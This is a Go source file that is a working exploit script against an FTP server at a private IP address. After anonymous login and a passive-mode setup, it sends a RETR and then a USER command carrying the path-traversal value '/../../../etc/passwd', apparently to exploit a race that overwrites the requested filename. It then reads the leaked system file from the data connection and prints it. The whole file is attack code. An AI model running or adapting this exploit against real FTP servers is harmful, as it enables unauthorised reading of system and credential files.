package main

import (
	"fmt"
	"net"
	"regexp"
	"strings"
)

func main() {
	IP := "192.168.1.20"
	PORT := "2121"

	sh, err := net.Dial("tcp", IP+":"+PORT)
	if err != nil {
		fmt.Println("Failed to connect:", err)
		return
	}

	logIn(sh)

	// Enter the PASV mode
	sendData(sh, "PASV\r\n")
	response := receiveData(sh)
	dataPort := extractDataPort(response)

	fmt.Println("PORT:", dataPort)

	// Enter the LIST command
	sendData(sh, "RETR /demo\r\n")
	// receiveData(sh)

	fmt.Println("sent LIST")
	// Delay the data connection
	// Send the USER command to overwrite the Filename field
	sendData(sh, "USER /../../../etc/passwd\r\n")
	// receiveData(sh)

	// Set up the data connection to the previous socket
	dataConn, err := net.Dial("tcp", IP+":"+dataPort)
	if err != nil {
		fmt.Println("Failed to connect to data port:", err)
		return
	}
	fmt.Printf("[*] Leaked content: %s\n", receiveData(dataConn))
}

func logIn(conn net.Conn) {
	fmt.Println(receiveData(conn))

	sendData(conn, "USER anonymous\r\n")
	fmt.Println(receiveData(conn))

	sendData(conn, "PASS anonymous\r\n")
	fmt.Println(receiveData(conn))
}

func sendData(conn net.Conn, data string) {
	_, err := conn.Write([]byte(data))
	if err != nil {
		fmt.Println("Failed to send data:", err)
	}
}

func receiveData(conn net.Conn) string {
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		fmt.Println("Failed to receive data:", err)
		return ""
	}
	return string(buffer[:n])
}

func extractDataPort(response string) string {
	re := regexp.MustCompile(`\d{0,3},\d{0,3}\)`)
	match := re.FindString(response)
	parts := strings.Split(match, ",")
	dataPort := fmt.Sprintf("%d", 256*toInt(parts[0])+toInt(strings.TrimSuffix(parts[1], ")")))
	return dataPort
}

func toInt(str string) int {
	val := 0
	for _, char := range str {
		val = val*10 + int(char-'0')
	}
	return val
}
